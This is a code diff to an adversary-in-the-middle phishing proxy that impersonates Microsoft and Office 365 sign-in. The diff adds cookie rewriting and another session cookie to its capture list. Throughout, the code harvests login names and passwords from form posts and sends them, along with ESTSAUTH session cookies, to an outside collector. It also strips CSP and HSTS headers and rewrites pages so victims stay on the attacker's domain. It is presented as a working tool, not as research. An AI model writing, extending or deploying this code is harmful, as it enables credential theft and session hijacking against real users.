@@ -20,7 +20,7 @@ const PROXY_DOMAINS = [
 ];
 
 // For detecting auth cookies
-const AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'];
+const AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx'];
 
 async function sendToVercel(type, data) {
   try {
@@ -44,9 +44,8 @@ async function exfiltrateCookies(cookieText, ip, url) {
   } catch (e) {}
 }
 
-// ==================== CRITICAL: URL PARSING WITH QUERY CLEANING ====================
+// ==================== URL PARSING WITH QUERY CLEANING ====================
 function parseProxiedUrl(pathname) {
-  // Check if this is a proxied request: /_p/domain/path
   if (pathname.startsWith(PROXY_PREFIX)) {
     const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
     const slashIndex = withoutPrefix.indexOf('/');
@@ -61,7 +60,6 @@ function parseProxiedUrl(pathname) {
       path = withoutPrefix.substring(slashIndex);
     }
     
-    // Only proxy if domain is in our list
     if (PROXY_DOMAINS.includes(domain)) {
       return { domain, path, isProxied: true };
     }
@@ -74,14 +72,11 @@ function shouldProxyDomain(hostname) {
   return PROXY_DOMAINS.includes(hostname);
 }
 
-// CRITICAL FIX: Remove 'path' parameters from query string
-// These are added by Office.com redirects and break Microsoft login
 function cleanQueryString(search) {
   if (!search) return '';
   const params = new URLSearchParams(search);
   let modified = false;
   
-  // Remove any 'path' parameters that were added by our proxy routing
   for (const key of Array.from(params.keys())) {
     if (key === 'path') {
       params.delete(key);
@@ -94,13 +89,56 @@ function cleanQueryString(search) {
   return newSearch ? '?' + newSearch : '';
 }
 
+// ==================== CRITICAL: BIDIRECTIONAL COOKIE REWRITING ====================
+
+// Rewrite cookies from client (our domain) to upstream (Microsoft domain)
+function rewriteRequestCookies(cookieHeader, targetDomain) {
+  if (!cookieHeader) return null;
+  
+  let modifiedCookies = cookieHeader;
+  
+  // Replace our domain with the target domain in cookie values
+  const ourDomainRegex = new RegExp(YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
+  modifiedCookies = modifiedCookies.replace(ourDomainRegex, targetDomain);
+  
+  // Also handle cookies with leading dot
+  const ourDomainDotRegex = new RegExp('\\.' + YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
+  modifiedCookies = modifiedCookies.replace(ourDomainDotRegex, '.' + targetDomain);
+  
+  return modifiedCookies;
+}
+
+// Rewrite cookies from upstream (Microsoft) to client (our domain)
+function rewriteResponseCookies(cookies, targetDomain) {
+  const modifiedCookies = [];
+  
+  for (const cookie of cookies) {
+    if (!cookie) continue;
+    let modifiedCookie = cookie;
+    
+    // Replace target domain with our domain
+    modifiedCookie = modifiedCookie.replace(
+      new RegExp(targetDomain.replace(/\./g, '\\.'), 'g'),
+      YOUR_DOMAIN
+    );
+    
+    // Also handle cookies with leading dot
+    modifiedCookie = modifiedCookie.replace(
+      new RegExp('\\.' + targetDomain.replace(/\./g, '\\.'), 'g'),
+      '.' + YOUR_DOMAIN
+    );
+    
+    modifiedCookies.push(modifiedCookie);
+  }
+  
+  return modifiedCookies;
+}
+
 function rewriteLocation(location, currentDomain) {
   if (!location) return location;
   
   try {
-    // Handle relative redirects - clean them first
     if (location.startsWith('/')) {
-      // Check if relative location has query string with 'path' params
       const qIndex = location.indexOf('?');
       if (qIndex !== -1) {
         const pathPart = location.substring(0, qIndex);
@@ -113,15 +151,11 @@ function rewriteLocation(location, currentDomain) {
     
     const url = new URL(location);
     
-    // If redirecting to a domain we proxy, rewrite it
     if (shouldProxyDomain(url.hostname)) {
-      // Clean any path parameters from the URL
       const cleanSearch = cleanQueryString(url.search);
-      
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}${url.hash}`;
     }
     
-    // Don't proxy external domains (like Microsoft's telemetry)
     return location;
   } catch (e) {
     return location;
@@ -133,7 +167,6 @@ function parseCredentials(bodyText) {
   if (!bodyText) return { user, pass };
   
   try {
-    // Try form-urlencoded (Microsoft login)
     const params = new URLSearchParams(bodyText);
     user = params.get('login') || params.get('loginfmt') || params.get('username') || params.get('Email');
     pass = params.get('passwd') || params.get('password') || params.get('Password');
@@ -163,12 +196,10 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Parse the request URL
   const { domain: targetDomain, path: targetPath, isProxied } = parseProxiedUrl(url.pathname);
   
-  // Handle non-proxied requests - redirect to office.com through our proxy
+  // Handle non-proxied requests
   if (!isProxied || !targetDomain) {
-    // Redirect to office.com/login through our proxy
     const redirectUrl = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com/login`;
     console.log(`[REDIRECT] Root -> ${redirectUrl}`);
     return new Response(null, {
@@ -181,13 +212,11 @@ export default async function handleRequest(request) {
     });
   }
 
-  // CRITICAL: Clean 'path' parameters before forwarding to upstream
   const cleanSearch = cleanQueryString(url.search);
   const upstreamUrl = `https://${targetDomain}${targetPath}${cleanSearch}`;
   
-  console.log(`[PROXY] ${request.method} ${url.pathname}${url.search} -> ${upstreamUrl}`);
+  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);
 
-  // Handle OPTIONS preflight
   if (request.method === 'OPTIONS') {
     return new Response(null, {
       status: 200,
@@ -204,21 +233,28 @@ export default async function handleRequest(request) {
   // Build request headers
   const headers = new Headers();
   
-  // Copy relevant headers
-  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie', 'authorization'];
+  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'authorization'];
   for (const h of headersToCopy) {
     const val = request.headers.get(h);
     if (val) headers.set(h, val);
   }
   
+  // CRITICAL: Rewrite cookies from client domain to upstream domain
+  const clientCookies = request.headers.get('cookie');
+  if (clientCookies) {
+    const rewrittenCookies = rewriteRequestCookies(clientCookies, targetDomain);
+    if (rewrittenCookies) {
+      headers.set('cookie', rewrittenCookies);
+      console.log(`[COOKIES] Rewrote request cookies for ${targetDomain}`);
+    }
+  }
+  
   headers.set('Host', targetDomain);
   
-  // Set referer if missing
   if (!headers.has('referer')) {
     headers.set('Referer', `https://${targetDomain}/`);
   }
   
-  // Remove problematic headers
   headers.delete('content-length');
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
@@ -235,9 +271,7 @@ export default async function handleRequest(request) {
       
       if (user && pass) {
         console.log(`[CREDS] Captured: ${user}`);
-        await sendToVercel('credentials', { 
-          ip, user, pass, url: url.href 
-        });
+        await sendToVercel('credentials', { ip, user, pass, url: url.href });
         
         const formData = new FormData();
         formData.append("file", new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
@@ -262,7 +296,7 @@ export default async function handleRequest(request) {
     if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
       const location = response.headers.get('Location');
       const rewrittenLocation = rewriteLocation(location, targetDomain);
-      console.log(`[REDIRECT] ${response.status} ${location} -> ${rewrittenLocation}`);
+      console.log(`[REDIRECT] ${response.status} -> ${rewrittenLocation}`);
       
       const redirectHeaders = new Headers();
       redirectHeaders.set('Location', rewrittenLocation);
@@ -278,24 +312,21 @@ export default async function handleRequest(request) {
     // Build response headers
     const responseHeaders = new Headers();
     
-    // Copy essential response headers
-    const headersToCopyResponse = ['content-type', 'content-length', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
+    const headersToCopyResponse = ['content-type', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
     for (const h of headersToCopyResponse) {
       const val = response.headers.get(h);
       if (val) responseHeaders.set(h, val);
     }
     
-    // Remove security headers that cause issues
     responseHeaders.delete('content-security-policy');
     responseHeaders.delete('content-security-policy-report-only');
     responseHeaders.delete('clear-site-data');
     responseHeaders.delete('strict-transport-security');
     
-    // Add CORS headers
     responseHeaders.set('Access-Control-Allow-Origin', '*');
     responseHeaders.set('Access-Control-Allow-Credentials', 'true');
     
-    // Process cookies
+    // Process cookies - CRITICAL: Rewrite from upstream domain to client domain
     const cookies = response.headers.getSetCookie?.() || [];
     let cookieStr = '';
     
@@ -304,32 +335,19 @@ export default async function handleRequest(request) {
       const hasAuth = hasAuthCookies(cookieStr);
       
       if (hasAuth) {
-        console.log(`[AUTH COOKIES] Found auth cookies`);
+        console.log(`[AUTH COOKIES] Found auth cookies from ${targetDomain}`);
         await exfiltrateCookies(cookieStr, ip, url.href);
       }
       
-      // Process each cookie - only replace the domain
-      for (const cookie of cookies) {
-        if (!cookie) continue;
-        let modifiedCookie = cookie;
-        
-        // Replace the target domain with our domain
-        modifiedCookie = modifiedCookie.replace(
-          new RegExp(targetDomain.replace(/\./g, '\\.'), 'g'),
-          YOUR_DOMAIN
-        );
-        
-        // Also handle cookies with leading dot
-        modifiedCookie = modifiedCookie.replace(
-          new RegExp('\\.' + targetDomain.replace(/\./g, '\\.'), 'g'),
-          '.' + YOUR_DOMAIN
-        );
-        
-        responseHeaders.append('Set-Cookie', modifiedCookie);
+      // Rewrite cookies for the client
+      const rewrittenCookies = rewriteResponseCookies(cookies, targetDomain);
+      for (const cookie of rewrittenCookies) {
+        responseHeaders.append('Set-Cookie', cookie);
       }
+      console.log(`[COOKIES] Rewrote ${rewrittenCookies.length} response cookies for client`);
     }
     
-    // Process response body for HTML/JS/CSS
+    // Process response body
     const contentType = response.headers.get('content-type') || '';
     
     if (contentType.includes('text/html') || 
@@ -349,7 +367,6 @@ export default async function handleRequest(request) {
       text = text.replace(/(src|href)="\/(?!_p\/)/g, `$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
       text = text.replace(/(src|href)='\/(?!_p\/)/g, `$1='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
       
-      // Fix form actions
       text = text.replace(/action="\/(?!_p\/)/g, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
       text = text.replace(/action='\/(?!_p\/)/g, `action='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
       
@@ -359,7 +376,6 @@ export default async function handleRequest(request) {
       });
     }
     
-    // Return binary content as-is
     return new Response(response.body, {
       status: response.status,
       headers: responseHeaders
